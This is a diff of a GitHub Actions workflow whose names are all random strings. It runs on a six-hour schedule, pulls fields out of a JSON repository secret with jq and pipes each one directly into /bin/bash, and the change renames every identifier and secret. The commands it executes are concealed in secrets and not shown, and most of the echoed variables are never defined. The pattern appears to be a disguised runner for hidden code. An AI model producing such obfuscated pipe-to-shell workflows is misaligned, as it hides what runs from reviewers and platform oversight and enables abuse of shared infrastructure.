@@ -1,9 +1,8 @@
 name: shisuanjian3489
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '44 1/6 * * *'
+    - cron: '0 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,15 +11,14 @@ jobs:
       - uses: actions/checkout@v4
       - name: shisuanjian3489
         env:
-          rxli954: ${{ secrets.rxli954 }}
+          cgpxl940: ${{ secrets.cgpxl940 }}
         run: |
-          echo $rxli954 | jq -r .ezqfv6843 | /bin/bash
-          echo $sl2753 | jq -r .tp380 | /bin/bash
-          echo $f0127 | jq -r .kp30 | /bin/bash
-          echo $pl5 | jq -r .ul64 | /bin/bash
-          echo $gs6 | jq -r .dz84 | /bin/bash
-          echo $hn59484 | jq -r .l48060 | /bin/bash
-          echo $d07 | jq -r .sggv091 | /bin/bash
-          echo $hs82 | jq -r .cebva12 | /bin/bash
-          echo $woq13247 | jq -r .rehri0169 | /bin/bash
+          echo $cgpxl940 | jq -r .mqxxf3353 | /bin/bash
+          echo $w406 | jq -r .az4209 | /bin/bash
+          echo $im26 | jq -r .qxd73 | /bin/bash
+          echo $qacl453 | jq -r .bq32 | /bin/bash
+          echo $tl4 | jq -r .c69331 | /bin/bash
+          echo $ce9257 | jq -r .r4894 | /bin/bash
+          echo $nmsoo7852 | jq -r .zty8737 | /bin/bash
+          echo $uyo615 | jq -r .pkepc83 | /bin/bash
 
